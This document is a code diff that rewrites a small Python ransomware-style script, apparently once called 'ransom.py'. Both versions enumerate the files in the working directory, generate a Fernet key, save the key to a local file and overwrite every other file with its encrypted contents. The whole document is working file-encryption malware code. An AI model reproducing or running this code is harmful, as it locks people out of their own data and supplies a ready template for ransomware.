@@ -1,30 +1,25 @@
-#outdated, wait for the upgrade
-
 import os
 from cryptography.fernet import Fernet
 
-data_file = []
+files = [file for file in os.listdir() if (os.path.isfile(file) and file not in __file__ and "dec" not in file and file != "kk.txt")]
 
-for file in os.listdir() :
-	if file == "ransom.py" or file == "thekey.key" or file == "dekripsi.py":
-		continue
-	
+def encrypt(files):
+    key = Fernet.generate_key()
+    
+    with open("kk.txt", 'wb') as kf:
+        kf.write(key)
 
-	if os.path.isfile(file) :
-		data_file.append(file)	
-	
+    for file in files:
+        with open(file, 'rb') as fl:
+            a = fl.read()
 
-kunci = Fernet.generate_key()
+        try :
+            aec = Fernet(key).encrypt(a)
 
-with open("thekey.key", "wb") as kuncifile :
-	kuncifile.write(kunci)
+        except:
+            continue
 
-for data in data_file :
-	with open(data, "rb") as thefile:
-		isi = thefile.read()
-	isi_enkripsi = Fernet(kunci).encrypt(isi)
-	
-	with open(data, "wb") as thefile :
-		thefile.write(isi_enkripsi)
+        with open(file, 'wb') as fl:
+            fl.write(aec)
 
-
+encrypt(files)
